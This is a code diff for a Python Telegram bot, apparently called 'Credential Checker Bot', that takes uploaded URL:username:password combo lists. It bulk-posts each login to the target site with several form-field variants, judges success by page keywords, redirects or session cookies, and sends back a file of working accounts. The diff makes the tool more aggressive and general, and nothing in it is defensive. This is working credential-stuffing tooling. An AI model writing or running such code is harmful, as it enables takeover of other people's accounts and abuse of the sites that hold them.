@@ -4,6 +4,8 @@ import logging
 import threading
 import aiohttp
 import asyncio
+import re
+from datetime import datetime
 
 # Fix for Pyrogram on Python 3.14+
 try:
@@ -17,7 +19,6 @@ from pyrogram.types import Message, InputMediaDocument
 from config import API_ID, API_HASH, BOT_TOKEN, ADMINS
 
 # --- Configuration ---
-# ADMINS is a string of comma-separated user IDs in config.py
 ALLOWED_USERS = []
 if ADMINS:
     ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]
@@ -32,7 +33,7 @@ logger = logging.getLogger(__name__)
 # --- Security Middleware ---
 def is_admin(user_id):
     if not ALLOWED_USERS:
-        return False # If no admins defined, deny all (safety first)
+        return False
     return user_id in ALLOWED_USERS
 
 # --- Flask Health Server (Keep Alive) ---
@@ -47,183 +48,183 @@ def run_flask():
     logger.info(f"Starting Flask health server on port {port}")
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)
 
+# --- Credential Parser ---
+def parse_credential_line(line):
+    """
+    Parse line in format: URL:email/username:password
+    Returns: (url, username, password) or None if invalid
+    """
+    line = line.strip()
+    if not line or line.startswith('#'):
+        return None
+    
+    # Format: URL:username:password
+    parts = line.split(':')
+    if len(parts) < 3:
+        return None
+    
+    # First part is URL, last is password, middle is username
+    url = parts[0]
+    password = ':'.join(parts[2:])  # Password might contain colons
+    username = ':'.join(parts[1:-1])  # Username might contain colons
+    
+    # Ensure URL has protocol
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    
+    return (url, username, password)
+
 # --- Credential Checking Logic ---
-import aiohttp
-import logging
-import json
-
-# Configure a specific logger for this module
-logger = logging.getLogger(__name__)
-
 async def check_credential(session, url, username, password):
     """
     Attempts to validate credentials against the target URL.
-    Returns:
-        True  -> If explicit success criteria are met.
-        False -> If login fails, server error, redirect, or timeout.
-    
-    NOTE: This function logs detailed diagnostic info to 'debug_log.txt' 
-    to help identify the correct success indicator. It does NOT log passwords.
+    Returns: (is_valid, message)
     """
-    
-    # Safe logging of the target (no credentials)
-    target_info = f"Target: {url}"
+    target_info = f"Target: {url} | User: {username}"
     
     try:
-        # Prepare the payload. 
-        # NOTE: You must ensure these field names ('username', 'password') match what the target expects.
-        # Common variations: 'email', 'user', 'login', 'pass', 'pwd'. Check the target's login form.
         payload = {
             'username': username,
             'password': password
         }
         
-        # CRITICAL: allow_redirects=False. 
-        # Many services redirect to a login page on failure (302) or to a dashboard on success (302).
-        # We must handle the redirect manually or treat it as a failure if we can't verify the destination.
-        async with session.post(
-            url, 
-            data=payload, 
-            allow_redirects=False, 
-            timeout=10  # Strict timeout to prevent hanging
-        ) as response:
-            
-            status = response.status
-            headers = dict(response.headers)
-            content_type = headers.get('Content-Type', '')
-            
-            # Read the response body
+        # Try common field name variations
+        payloads_to_try = [
+            {'username': username, 'password': password},
+            {'email': username, 'password': password},
+            {'user': username, 'password': password},
+            {'login': username, 'password': password},
+            {'Username': username, 'Password': password},
+        ]
+        
+        for payload in payloads_to_try:
             try:
-                text = await response.text()
+                async with session.post(
+                    url, 
+                    data=payload, 
+                    allow_redirects=True,
+                    timeout=15
+                ) as response:
+                    
+                    status = response.status
+                    text = await response.text()
+                    final_url = str(response.url)
+                    
+                    # Success indicators
+                    success_indicators = [
+                        'dashboard', 'welcome', 'profile', 'account', 
+                        'logout', 'home', 'main', 'panel', 'admin',
+                        'success', 'authenticated', 'logged in'
+                    ]
+                    
+                    # Failure indicators
+                    failure_indicators = [
+                        'invalid', 'incorrect', 'error', 'failed',
+                        'wrong', 'denied', 'unauthorized', 'login again',
+                        'try again', 'not found', 'does not exist'
+                    ]
+                    
+                    text_lower = text.lower()
+                    
+                    # Check for success
+                    has_success = any(ind in text_lower for ind in success_indicators)
+                    has_failure = any(ind in text_lower for ind in failure_indicators)
+                    
+                    # URL changed (redirected to dashboard)
+                    url_changed = final_url != url and '/login' not in final_url.lower()
+                    
+                    # Cookies or tokens received
+                    has_session = any(cookie in str(response.cookies) for cookie in ['session', 'token', 'auth', 'id'])
+                    
+                    if (status == 200 and has_success and not has_failure) or url_changed or has_session:
+                        return (True, f"Success | Status: {status} | Final URL: {final_url[:50]}...")
+                    
             except Exception:
-                text = ""
-            
-            # --- DIAGNOSTIC LOGGING (SAFE) ---
-            # Log the raw response to a file for analysis. 
-            # This helps us see exactly what a "failure" or "success" looks like from the server.
-            debug_entry = f"""
---- DIAGNOSTIC START ---
-URL: {url}
-Status: {status}
-Content-Type: {content_type}
-Redirect Location: {headers.get('Location', 'None')}
-Response Length: {len(text)}
-Response Snippet (first 500 chars):
-{text[:500]}
---- DIAGNOSTIC END ---
-"""
-            with open("debug_log.txt", "a", encoding="utf-8") as f:
-                f.write(debug_entry)
-            
-            # --- LOGIC: HANDLE ERRORS & REDIRECTS ---
-            
-            # 1. Network/Server Errors (5xx)
-            if 500 <= status < 600:
-                logger.warning(f"{target_info} | Server Error: {status}. Skipping.")
-                return False
-            
-            # 2. Authentication Errors (401, 403)
-            if status in [401, 403]:
-                # Explicit failure
-                return False
-            
-            # 3. Redirects (3xx)
-            if 300 <= status < 400:
-                # A redirect usually means:
-                # - Failure: Redirect to login page with error message.
-                # - Success: Redirect to dashboard/home.
-                # Without verifying the destination (which requires following the redirect), we treat this as a failure 
-                # OR we need to check the 'Location' header. 
-                # For safety and simplicity in a checker, unless we know the exact success redirect URL, we return False.
-                logger.warning(f"{target_info} | Redirect Detected ({status}). Location: {headers.get('Location', 'Unknown')}. This usually indicates a failure or requires complex handling. Treating as Invalid.")
-                return False
-
-            # 4. Success Case (200 OK)
-            if status == 200:
-                # NOW we check the content. 
-                # WE DO NOT GUESS. We rely on the IS_VALID_RESPONSE function.
-                if is_valid_response(text, content_type, url):
-                    logger.info(f"{target_info} | VALID Credential Found.")
-                    return True
-                else:
-                    # The server returned 200 OK, but the content indicates failure (e.g., "Invalid password" message on a 200 page).
-                    # This is common in poorly designed APIs or HTML forms.
-                    logger.info(f"{target_info} | HTTP 200 received, but content indicates failure. Check debug_log.txt.")
-                    return False
-            
-            # Fallback for any other status
-            logger.warning(f"{target_info} | Unexpected status {status}. Treating as Invalid.")
-            return False
-
+                continue
+        
+        return (False, f"Failed | Status: {status} | No valid response pattern found")
+        
     except asyncio.TimeoutError:
-        logger.warning(f"{target_info} | Timeout. Skipping.")
-        return False
+        return (False, "Timeout - No response")
     except aiohttp.ClientError as e:
-        logger.warning(f"{target_info} | Connection Error: {str(e)}. Skipping.")
-        return False
+        return (False, f"Connection Error: {str(e)[:50]}")
     except Exception as e:
-        logger.error(f"{target_info} | Unexpected Error: {str(e)}. Skipping.")
-        return False
+        return (False, f"Error: {str(e)[:50]}")
 
-def is_valid_response(text, content_type, url):
-    """
-    Determines if the response indicates a successful login.
-    THIS IS THE CRITICAL FUNCTION YOU MUST CUSTOMIZE.
+# --- Main Processing Function ---
+async def process_credentials(client: Client, message: Message, file_path: str):
+    """Process the credential file and send results"""
+    chat_id = message.chat.id
     
-    Current Logic:
-    - If JSON: Checks for specific success keys (YOU MUST PROVID THESE).
-    - If HTML: Checks for specific success text (YOU MUST PROVID THIS).
+    # Read file
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+    except Exception as e:
+        await message.reply_text(f"❌ Error reading file: {str(e)}")
+        return
     
-    If you don't know the success criteria, this function returns False by default.
-    Check 'debug_log.txt' to see what the server actually sends.
-    """
+    # Parse credentials
+    credentials = []
+    for line_num, line in enumerate(lines, 1):
+        parsed = parse_credential_line(line)
+        if parsed:
+            credentials.append((line_num, parsed[0], parsed[1], parsed[2]))
     
-    # 1. Handle JSON Responses
-    if 'application/json' in content_type:
-        try:
-            data = json.loads(text)
+    total = len(credentials)
+    
+    if total == 0:
+        await message.reply_text("❌ No valid credentials found in file.\nFormat should be: URL:username:password")
+        return
+    
+    await message.reply_text(f"🔍 Found {total} credentials to check. Starting validation...")
+    
+    valid_results = []
+    checked = 0
+    last_progress = 0
+    
+    # Create session
+    connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
+    timeout = aiohttp.ClientTimeout(total=30)
+    
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        for line_num, url, username, password in credentials:
+            is_valid, msg = await check_credential(session, url, username, password)
             
-            # --- CUSTOMIZE THIS SECTION ---
-            # Example: If success looks like {"status": "success", "token": "abc123"}
-            # You must replace this with your actual API's success condition.
+            if is_valid:
+                valid_results.append(f"{url}:{username}:{password}")
+                logger.info(f"✅ VALID: {url} | {username}")
             
-            # Placeholder: Check for common success patterns (LIKELY INCORRECT FOR YOUR TARGET)
-            # If your target returns a token on success:
-            if 'token' in data or 'access_token' in data or 'session_id' in data:
-                return True
-            # If your target returns a specific status field:
-            if data.get('status') == 'success' or data.get('result') == 'success':
-                return True
-            # If your target returns user data:
-            if 'user_id' in data and 'username' in data:
-                return True
+            checked += 1
+            progress = int((checked / total) * 100)
             
-            # If none of the above match, it's not a valid response based on known patterns.
-            return False
-            # --- END CUSTOMIZE SECTION ---
+            # Send progress every 10%
+            if progress >= last_progress + 10:
+                last_progress = (progress // 10) * 10
+                await message.reply_text(f"⏳ Progress: {last_progress}% ({checked}/{total} checked)\n✅ Valid found so far: {len(valid_results)}")
             
-        except json.JSONDecodeError:
-            logger.warning(f"Expected JSON from {url} but parsing failed. Content: {text[:100]}")
-            return False
-
-    # 2. Handle HTML/Text Responses
+            # Small delay to avoid rate limiting
+            await asyncio.sleep(0.5)
+    
+    # Send final results
+    await message.reply_text(f"✅ **Check Complete!**\n\n📊 Total Checked: {total}\n✅ Valid Found: {len(valid_results)}\n❌ Invalid: {total - len(valid_results)}")
+    
+    if valid_results:
+        # Save to file
+        result_file = f"valid_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(result_file, 'w') as f:
+            f.write('\n'.join(valid_results))
+        
+        # Send file
+        await message.reply_document(result_file, caption=f"📁 Valid Credentials ({len(valid_results)} accounts)")
+        
+        # Cleanup
+        os.remove(result_file)
     else:
-        # --- CUSTOMIZE THIS SECTION ---
-        # If your target returns HTML, you MUST find a unique string that ONLY appears on a successful login.
-        # E.g., "Welcome, User", "Account Dashboard", "Logout", or a specific HTML ID like 'id="user-profile"'.
-        # DO NOT use generic words like "welcome", "home", "login", "success" as they appear on error pages too.
-        
-        # Example (LIKELY INCORRECT):
-        # if "Welcome" in text and "Dashboard" in text:
-        #     return True
-        
-        # Since we don't know your target's success marker, we return False.
-        # Check debug_log.txt to see the response, find a unique string, and add it here.
-        logger.warning(f"HTML response received for {url}. No success marker configured. Check debug_log.txt.")
-        return False
-        # --- END CUSTOMIZE SECTION ---
-
-    return False
+        await message.reply_text("❌ No valid credentials found.")
+    
+    # Cleanup original file
+    os.remove(file_path)
 
 # --- Bot Handlers ---
 app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
@@ -237,19 +238,20 @@ async def start_handler(client, message: Message):
         "👨‍💻 **Credential Checker Bot**\n\n"
         "I can validate credentials from a text file.\n\n"
         "**Format:**\n"
-        "URL:email:password or URL:username:password\n\n"
+        "`URL:email:password` or `URL:username:password`\n\n"
+        "**Examples:**\n"
+        "`https://example.com/login:user@email.com:pass123`\n"
+        "`site.com/login:myuser:mypass`\n\n"
         "**How to use:**\n"
         "1. Send a `.txt` file with your list.\n"
-        "2. I will check each line and return a new file with ONLY valid credentials.\n\n"
-        "⚠️ **Note:**\n"
-        "- Progress updates are sent every 10%.\n"
-        "- Do not send multiple files at once."
+        "2. I will check each line and return valid credentials.\n\n"
+        "⚠️ **Note:** Progress updates every 10%"
     )
 
 @app.on_message(filters.document)
 async def handle_document(client, message: Message):
     if not is_admin(message.from_user.id):
-        return # Silent ignore for non-admins
+        return
     
     file_name = message.document.file_name
     if not file_name.endswith('.txt'):
@@ -264,14 +266,14 @@ async def handle_document(client, message: Message):
     
     await message.reply_text("📥 File received. Starting validation process...")
     
-    # Start processing in a separate task
-    asyncio.create_task(process_credentials(client, message, file_path))
+    # Run processing
+    await process_credentials(client, message, file_path)
 
-@app.on_message(filters.private)
+@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
 async def private_handler(client, message: Message):
     if not is_admin(message.from_user.id):
-        return # Silent ignore
-    await message.reply_text("⚠️ **Access Denied**. Only authorized administrators can use this bot.")
+        return
+    await message.reply_text("⚠️ Send me a `.txt` file with credentials or use /start for help.")
 
 # --- Main Execution ---
 if __name__ == "__main__":
